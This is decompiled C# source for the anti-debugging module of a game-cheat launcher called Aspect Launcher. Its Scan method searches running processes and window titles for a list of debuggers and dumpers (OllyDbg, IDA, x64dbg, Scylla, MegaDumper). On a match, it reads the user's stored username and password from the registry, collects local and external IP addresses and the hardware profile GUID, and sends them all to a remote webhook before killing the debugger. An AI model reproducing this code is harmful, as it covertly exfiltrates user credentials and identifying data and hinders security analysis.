using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AspectLauncheV4.Antidebug
{
	// Token: 0x02000014 RID: 20
	internal class Scanner
	{
		// Token: 0x0600006D RID: 109 RVA: 0x0000617A File Offset: 0x0000437A
		public static void ScanAndKill()
		{
			Scanner.Scan(true);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00006184 File Offset: 0x00004384
		private static int Scan(bool KillProcess)
		{
			int result = 0;
			if (Scanner.BadProcessnameList.Count == 0 && Scanner.BadWindowTextList.Count == 0)
			{
				Scanner.Init();
			}
			foreach (Process process in Process.GetProcesses())
			{
				if (Scanner.BadProcessnameList.Contains(process.ProcessName) || Scanner.BadWindowTextList.Contains(process.MainWindowTitle))
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Aspect Cheats");
					object value = registryKey.GetValue("Username");
					object value2 = registryKey.GetValue("Password");
					Guid.NewGuid();
					string text = Registry.GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", null).ToString();
					Form1.Webmessage("Aspect Launcher", string.Concat(new string[]
					{
						"Debugger Detected: ",
						process.ProcessName,
						"\nUsername: ",
						(value != null) ? value.ToString() : null,
						"\n Password: ",
						(value2 != null) ? value2.ToString() : null,
						"\nIP 1: ",
						Form1.GetLocaladd(),
						"\nIP 2: ",
						Form1.Getad(),
						"\n HWID:",
						text
					}), "Aspect Launcher", "15105570");
					result = 1;
					if (!KillProcess)
					{
						break;
					}
					try
					{
						Application.Exit();
						process.Kill();
						break;
					}
					catch (Win32Exception)
					{
						break;
					}
					catch (NotSupportedException)
					{
						break;
					}
					catch (InvalidOperationException)
					{
						break;
					}
				}
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00006314 File Offset: 0x00004514
		private static int Init()
		{
			if (Scanner.BadProcessnameList.Count > 0 && Scanner.BadWindowTextList.Count > 0)
			{
				return 1;
			}
			Scanner.BadProcessnameList.Add("ollydbg");
			Scanner.BadProcessnameList.Add("ida");
			Scanner.BadProcessnameList.Add("ida64");
			Scanner.BadProcessnameList.Add("idag");
			Scanner.BadProcessnameList.Add("idag64");
			Scanner.BadProcessnameList.Add("idaw");
			Scanner.BadProcessnameList.Add("idaw64");
			Scanner.BadProcessnameList.Add("idaq");
			Scanner.BadProcessnameList.Add("idaq64");
			Scanner.BadProcessnameList.Add("idau");
			Scanner.BadProcessnameList.Add("idau64");
			Scanner.BadProcessnameList.Add("scylla");
			Scanner.BadProcessnameList.Add("scylla_x64");
			Scanner.BadProcessnameList.Add("scylla_x86");
			Scanner.BadProcessnameList.Add("protection_id");
			Scanner.BadProcessnameList.Add("x64dbg");
			Scanner.BadProcessnameList.Add("x32dbg");
			Scanner.BadProcessnameList.Add("windbg");
			Scanner.BadProcessnameList.Add("reshacker");
			Scanner.BadProcessnameList.Add("ImportREC");
			Scanner.BadProcessnameList.Add("IMMUNITYDEBUGGER");
			Scanner.BadProcessnameList.Add("MegaDumper");
			Scanner.BadWindowTextList.Add("OLLYDBG");
			Scanner.BadWindowTextList.Add("ida");
			Scanner.BadWindowTextList.Add("disassembly");
			Scanner.BadWindowTextList.Add("scylla");
			Scanner.BadWindowTextList.Add("Debug");
			Scanner.BadWindowTextList.Add("[CPU");
			Scanner.BadWindowTextList.Add("Immunity");
			Scanner.BadWindowTextList.Add("WinDbg");
			Scanner.BadWindowTextList.Add("x32dbg");
			Scanner.BadWindowTextList.Add("x64dbg");
			Scanner.BadWindowTextList.Add("Import reconstructor");
			Scanner.BadWindowTextList.Add("MegaDumper");
			Scanner.BadWindowTextList.Add("MegaDumper 1.0 by CodeCracker / SnD");
			return 0;
		}

		// Token: 0x040002DB RID: 731
		private static HashSet<string> BadProcessnameList = new HashSet<string>();

		// Token: 0x040002DC RID: 732
		private static HashSet<string> BadWindowTextList = new HashSet<string>();
	}
}
